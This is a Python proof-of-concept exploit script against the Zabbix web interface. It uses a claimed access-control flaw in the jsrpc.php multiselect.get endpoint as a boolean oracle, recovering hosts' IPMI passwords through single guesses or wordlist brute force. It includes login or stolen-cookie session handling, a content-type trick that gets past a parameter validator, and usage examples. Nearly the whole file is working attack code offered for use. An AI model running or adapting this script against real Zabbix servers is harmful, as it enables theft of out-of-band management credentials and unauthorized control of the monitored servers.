#!/usr/bin/env python3
"""
Zabbix IPMI Password Exfiltration - PoC Exploit
CVE: pending

Vulnerability: Broken Access Control in jsrpc.php multiselect.get endpoint.
A low-privileged user can filter hosts by any column in the DB schema,
including sensitive fields like ipmi_password, without column-level ACL.
The presence or absence of results acts as a boolean oracle.

Target field: ipmi_password (max 20 chars per schema)
"""

import requests
import argparse
import sys
import time
import urllib.parse
from pathlib import Path


# ipmi_password column is FIELD_TYPE_CHAR with length 20 (schema.inc.php)
IPMI_PASSWORD_MAX_LEN = 20


def check_password(session: requests.Session, zbx_url: str, guess: str,
                   delay: float = 0.0) -> tuple[bool, list]:
    """
    Send a single boolean oracle query against the ipmi_password column.

    Returns (matched: bool, host_list: list).
    A non-empty result array means the guess matched at least one host.

    Content-Type must be application/x-www-form-urlencoded to bypass
    the JSON parameter validator that would otherwise return an empty result.
    """
    if delay:
        time.sleep(delay)

    payload = (
        "method=multiselect.get"
        "&object_name=hosts"
        f"&filter[ipmi_password]={urllib.parse.quote(guess, safe='')}"
    )

    try:
        r = session.post(
            f"{zbx_url}/jsrpc.php?type=11",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10,
        )
        r.raise_for_status()
        result = r.json().get("result", [])
        return len(result) > 0, result

    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
        return False, []
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False, []
    except (ValueError, KeyError) as e:
        print(f"[!] Failed to parse JSON response: {e}", file=sys.stderr)
        return False, []


def login(zbx_url: str, username: str, password: str,
          verify_ssl: bool = True) -> requests.Session:
    """
    Authenticate against the Zabbix web UI and return a session
    carrying the zbx_session cookie.
    """
    session = requests.Session()
    session.verify = verify_ssl

    try:
        r = session.post(
            f"{zbx_url}/index.php",
            data={"name": username, "password": password,
                  "autologin": "1", "enter": "Sign in"},
            allow_redirects=True,
            timeout=15,
        )
        r.raise_for_status()

        if "zbx_session" in session.cookies or "zbx_sessionid" in session.cookies:
            print(f"[+] Logged in as: {username}")
            return session

        print("[!] Login failed — no session cookie received. Check credentials.")
        sys.exit(1)

    except Exception as e:
        print(f"[!] Login error: {e}", file=sys.stderr)
        sys.exit(1)


def print_hit(guess: str, hosts: list) -> None:
    """Print match details including affected hosts returned by the oracle."""
    print(f"\n[+] HIT: ipmi_password = {guess!r}")
    print("[+] Affected host(s):")
    for h in hosts:
        print(f"    - {h.get('name', '?')}  (id: {h.get('id', '?')})")


def single_mode(session: requests.Session, zbx_url: str,
                guess: str, delay: float) -> None:
    """Check a single password guess against the oracle."""
    if len(guess) > IPMI_PASSWORD_MAX_LEN:
        print(f"[!] Guess exceeds ipmi_password max length ({IPMI_PASSWORD_MAX_LEN}). Aborting.")
        sys.exit(1)

    print(f"[*] Target : {zbx_url}")
    print(f"[*] Guess  : {guess!r}")
    print("-" * 50)

    hit, hosts = check_password(session, zbx_url, guess, delay)
    if hit:
        print_hit(guess, hosts)
    else:
        print("[-] No match.")


def wordlist_mode(session: requests.Session, zbx_url: str, wordlist_path: str,
                  delay: float, stop_on_first: bool) -> None:
    """
    Iterate over a wordlist and query the boolean oracle for each entry.
    Entries longer than IPMI_PASSWORD_MAX_LEN are skipped automatically.
    """
    wl = Path(wordlist_path)
    if not wl.exists():
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)

    words = [line.strip() for line in wl.read_text(errors="ignore").splitlines()
             if line.strip()]

    print(f"[*] Target   : {zbx_url}")
    print(f"[*] Wordlist : {wordlist_path} ({len(words)} entries)")
    print(f"[*] Delay    : {delay}s per request")
    print("-" * 50)

    found = []
    skipped = 0

    try:
        for i, guess in enumerate(words, 1):
            if len(guess) > IPMI_PASSWORD_MAX_LEN:
                skipped += 1
                continue

            print(f"[{i}/{len(words)}] Trying: {guess!r}", end="  ", flush=True)
            hit, hosts = check_password(session, zbx_url, guess, delay)

            if hit:
                print("<-- HIT!")
                found.append((guess, hosts))
                if stop_on_first:
                    break
            else:
                print("miss")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    # Summary
    print("\n" + "=" * 50)
    if skipped:
        print(f"[~] Skipped {skipped} entries exceeding max length ({IPMI_PASSWORD_MAX_LEN}).")
    if found:
        print(f"[+] Found {len(found)} matching password(s):")
        for pw, hosts in found:
            print_hit(pw, hosts)
    else:
        print("[-] No matches found.")


def main():
    parser = argparse.ArgumentParser(
        description="Zabbix IPMI Password Boolean Oracle — PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single guess
  python zabbix_ipmi_checker.py -u http://zabbixhost \\
      --zabbix-user lowprivuser --zabbix-pass hunter2 \\
      --guess "password"

  # Wordlist, stop on first match
  python zabbix_ipmi_checker.py -u http://zabbixhost \\
      --zabbix-user lowprivuser --zabbix-pass hunter2 \\
      --wordlist wordlist.txt --stop-on-first

  # Use an existing session cookie instead of logging in
  python zabbix_ipmi_checker.py -u http://zabbixhost \\
      --cookie "zbx_session=abc123def456" \\
      --wordlist wordlist.txt --delay 0.3
        """
    )

    parser.add_argument("-u", "--url", required=True,
                        help="Zabbix base URL (e.g. http://zabbixhost)")

    # Auth: either login credentials or an existing session cookie
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("--zabbix-user", metavar="USER",
                            help="Zabbix username (used to obtain a session cookie)")
    auth_group.add_argument("--cookie", metavar="COOKIE",
                            help='Existing session cookie (e.g. "zbx_session=abc123")')

    parser.add_argument("--zabbix-pass", metavar="PASS",
                        help="Zabbix password (required with --zabbix-user)")

    # Mode: single guess or wordlist
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--guess", metavar="PASSWORD",
                            help="Single password to check")
    mode_group.add_argument("--wordlist", metavar="FILE",
                            help="Path to wordlist file (one password per line)")

    parser.add_argument("--delay", type=float, default=0.0,
                        help="Delay in seconds between requests (default: 0)")
    parser.add_argument("--stop-on-first", action="store_true",
                        help="Stop after the first match (wordlist mode only)")
    parser.add_argument("--no-verify-ssl", action="store_true",
                        help="Disable SSL certificate verification")

    args = parser.parse_args()

    if args.zabbix_user and not args.zabbix_pass:
        parser.error("--zabbix-pass is required when using --zabbix-user")

    zbx_url = args.url.rstrip("/")
    verify_ssl = not args.no_verify_ssl

    if not verify_ssl:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Build session
    if args.cookie:
        session = requests.Session()
        session.verify = verify_ssl
        name, _, value = args.cookie.partition("=")
        session.cookies.set(name.strip(), value.strip())
        print(f"[+] Using provided session cookie.")
    else:
        session = login(zbx_url, args.zabbix_user, args.zabbix_pass, verify_ssl)

    # Dispatch mode
    if args.guess:
        single_mode(session, zbx_url, args.guess, args.delay)
    else:
        wordlist_mode(session, zbx_url, args.wordlist, args.delay, args.stop_on_first)


if __name__ == "__main__":
    main()
